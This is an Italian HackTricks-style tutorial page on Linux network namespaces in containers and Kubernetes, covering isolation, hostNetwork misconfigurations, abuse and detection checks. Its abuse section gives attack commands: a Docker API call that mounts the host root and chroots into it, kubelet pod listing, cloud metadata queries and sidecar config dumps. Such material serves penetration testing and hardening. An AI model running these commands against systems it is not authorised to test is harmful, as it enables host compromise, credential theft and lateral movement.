# Spazio dei nomi di rete

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Lo spazio dei nomi di rete isola le risorse relative alla rete, come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole del firewall, socket, lo spazio dei nomi dei socket astratti del dominio UNIX e il contenuto di file come `/proc/net`. Per questo un container può avere quella che sembra essere la propria `eth0`, le proprie route locali e il proprio dispositivo loopback senza possedere il vero network stack dell'host.

Dal punto di vista della sicurezza, questo è importante perché l'isolamento di rete riguarda molto più del semplice port binding. Uno spazio dei nomi di rete privato limita ciò che il workload può osservare o riconfigurare direttamente. Quando questo spazio dei nomi viene condiviso con l'host, il container può ottenere improvvisamente visibilità sui listener dell'host, sui servizi locali dell'host, sugli endpoint AF_UNIX astratti e sui punti di controllo della rete che non erano mai destinati a essere esposti all'applicazione.

## Funzionamento

Uno spazio dei nomi di rete appena creato inizia con un ambiente di rete vuoto o quasi vuoto finché non vengono collegate delle interfacce. I container runtime creano quindi interfacce virtuali o vi si connettono, assegnano indirizzi e configurano le route affinché il workload disponga della connettività prevista. Nelle implementazioni basate su bridge, questo significa solitamente che il container vede un'interfaccia supportata da veth, collegata a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresenti un cambiamento così drastico. Invece di ricevere uno stack di rete privato già preparato, il workload entra a far parte di quello effettivo dell'host.

## Laboratorio

Puoi visualizzare uno spazio dei nomi di rete quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e quelli che usano la rete dell'host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il container con rete host non dispone più di una propria vista isolata di socket e interfacce. Questo cambiamento è già significativo, ancor prima di chiedersi quali capabilities abbia il processo.

## Utilizzo a runtime

Docker e Podman normalmente creano un network namespace privato per ogni container, salvo diversa configurazione. Kubernetes solitamente assegna a ogni Pod un proprio network namespace, condiviso dai container all'interno di quel Pod ma separato dall'host. Ciò significa che `127.0.0.1` è generalmente locale al Pod anziché al container: un listener associato solo a localhost in un container è in genere raggiungibile dai suoi sidecar e container fratelli. Anche i sistemi Incus/LXC forniscono un isolamento basato sui network namespace, spesso con una maggiore varietà di configurazioni di rete virtuale.

Il principio comune è che la rete privata costituisce il confine di isolamento predefinito, mentre la rete host è un opt-out esplicito da tale confine.

## Configurazioni errate

La configurazione errata più importante consiste semplicemente nella condivisione del network namespace dell'host. A volte ciò viene fatto per motivi di performance, per il monitoring a basso livello o per comodità, ma rimuove uno dei confini più netti disponibili per i container. I listener locali all'host diventano raggiungibili in modo più diretto, i servizi accessibili solo tramite localhost possono diventare accessibili e capabilities come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose, perché le operazioni che abilitano vengono ora applicate all'ambiente di rete dell'host stesso.

Un altro problema consiste nell'assegnare capabilities relative alla rete in misura eccessiva anche quando il network namespace è privato. Un namespace privato è utile, ma non rende innocui i raw socket o il controllo avanzato della rete.

In Kubernetes, `hostNetwork: true` modifica anche il livello di affidamento che si può riporre nella segmentazione di rete a livello di Pod. Kubernetes documenta che molti network plugin non sono in grado di distinguere correttamente il traffico dei Pod `hostNetwork` per il matching di `podSelector` / `namespaceSelector` e lo trattano quindi come normale traffico del nodo. Dal punto di vista di un attaccante, ciò significa che un workload `hostNetwork` compromesso dovrebbe spesso essere considerato un foothold di rete a livello di nodo, anziché un normale Pod ancora soggetto alle stesse ipotesi sulle policy dei workload che usano una overlay network.

## Abuso

In configurazioni con isolamento debole, gli attaccanti possono ispezionare i servizi in ascolto sull'host, raggiungere endpoint di gestione associati solo al loopback, sniffare o interferire con il traffico a seconda delle capabilities e dell'ambiente specifici, oppure riconfigurare lo stato del routing e del firewall se `CAP_NET_ADMIN` è presente. In un cluster, ciò può inoltre facilitare il movimento laterale e la ricognizione del control plane.

Se sospetti l'utilizzo della rete host, inizia verificando che le interfacce e i listener visibili appartengano all'host anziché a una rete isolata del container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi accessibili solo tramite loopback sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
I socket UNIX astratti sono un altro obiettivo facile da non considerare, perché hanno uno scope limitato al network namespace, anche se non assomigliano a listener TCP/UDP e potrebbero non esistere come percorsi del filesystem sotto `/run`. Un container con rete dell'host può quindi ereditare l'accesso a canali di controllo riservati all'host che non sono mai stati sottoposti a bind mount nel container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Un esempio storico è stato il bug di esposizione del socket astratto `containerd-shim`, ma la lezione più ampia è più importante della CVE specifica: una volta che un workload entra nel network namespace dell'host, anche i servizi AF_UNIX astratti diventano parte dell'attack surface. Se quei socket sembrano correlati al runtime o amministrativi, passa a [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Se sono presenti network capabilities, verifica se il workload può ispezionare o modificare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Sui kernel moderni, il networking dell'host insieme a `CAP_NET_ADMIN` può inoltre esporre il percorso dei pacchetti oltre le semplici modifiche a `iptables` / `nftables`. Anche i qdisc e i filtri `tc` sono soggetti al namespace, quindi, in un network namespace dell'host condiviso, si applicano alle interfacce dell'host visibili al container. Se è presente anche `CAP_BPF`, diventano rilevanti anche i programmi eBPF relativi alla rete, come i loader TC e XDP:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Questo è importante perché un attacker potrebbe essere in grado di eseguire il mirroring, il redirect, il traffic shaping o il drop del traffico a livello dell’interfaccia dell’host, non limitandosi a riscrivere le regole del firewall. In un private network namespace, queste azioni sono contenute nella vista del container; in un shared host namespace, invece, hanno un impatto sull’host.

Negli ambienti cluster o cloud, il networking dell’host giustifica inoltre un rapido recon locale dei metadata e dei servizi adiacenti al control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes, ricorda che compromettere **qualsiasi** container in un Pod multi-container dà anche accesso ai listener localhost aperti dai container sibling e dai sidecar, perché l'intero Pod condivide un unico network namespace. Questo è particolarmente rilevante per i container di service-mesh, osservabilità e helper, le cui interfacce di amministrazione o debug sono intenzionalmente interne al Pod anziché disponibili a livello di cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Considera "bound to localhost" come **Pod-private**, non **container-private**. Dopo la compromissione di un container nel Pod, questa supposizione non è più valida.

### Esempio completo: Host Networking + Accesso locale al Runtime / Kubelet

L'Host networking non fornisce automaticamente i privilegi di root sull'host, ma spesso espone servizi che sono intenzionalmente raggiungibili solo dal node stesso. Se uno di questi servizi è debolmente protetto, l'Host networking diventa un percorso diretto per l'escalation dei privilegi.

Docker API su localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impatto:

- compromissione diretta dell'host se un'API runtime locale è esposta senza una protezione adeguata
- ricognizione del cluster o movimento laterale se kubelet o gli agent locali sono raggiungibili
- manipolazione del traffico o denial of service se combinato con `CAP_NET_ADMIN`

## Controlli

L'obiettivo di questi controlli è capire se il processo dispone di uno stack di rete privato, quali route e listener sono visibili e se la visualizzazione della rete appare già simile a quella dell'host prima ancora di testare le capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Cosa è interessante qui:

- Se `/proc/self/ns/net` e `/proc/1/ns/net` sembrano già appartenere all'host, il container potrebbe condividere il network namespace dell'host o un altro namespace non privato.
- `lsns -t net` e `ip netns identify` sono utili quando la shell si trova già all'interno di un namespace denominato o persistente e si vuole correlare quest'ultimo agli oggetti in `/run/netns` dal lato dell'host.
- `ss -lntup` è particolarmente utile perché rivela i listener accessibili solo tramite loopback e gli endpoint di gestione locali. `ss -xap` e `/proc/net/unix` aggiungono la visualizzazione degli abstract socket che le normali ricerche dei socket nel filesystem non rilevano.
- Le route, i nomi delle interfacce, il contesto del firewall, lo stato di `tc` e gli attachment eBPF diventano molto più importanti se sono presenti `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF`.
- In Kubernetes, la mancata risoluzione di un service name da un Pod `hostNetwork` può semplicemente significare che il Pod non utilizza `dnsPolicy: ClusterFirstWithHostNet`, non che il service sia assente.
- Nei Pod multi-container, i listener su localhost appartengono all'intero network namespace del Pod; quindi è necessario controllare i sidecar e i container fratelli prima di presumere che una porta accessibile solo tramite loopback sia irraggiungibile dal container compromesso.

Durante l'analisi di un container, valutare sempre il network namespace insieme al capability set. Il networking dell'host combinato con forti network capabilities rappresenta una postura molto diversa rispetto al networking bridge combinato con un set ristretto di capability predefinite.

## Riferimenti

- [Caveat di Kubernetes relativi a NetworkPolicy e `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` di Linux e isolamento degli abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Advisory di containerd: abstract Unix domain socket esposti ai container che usano il networking dell'host](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Requisiti di token e capability eBPF per i programmi eBPF relativi al networking](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
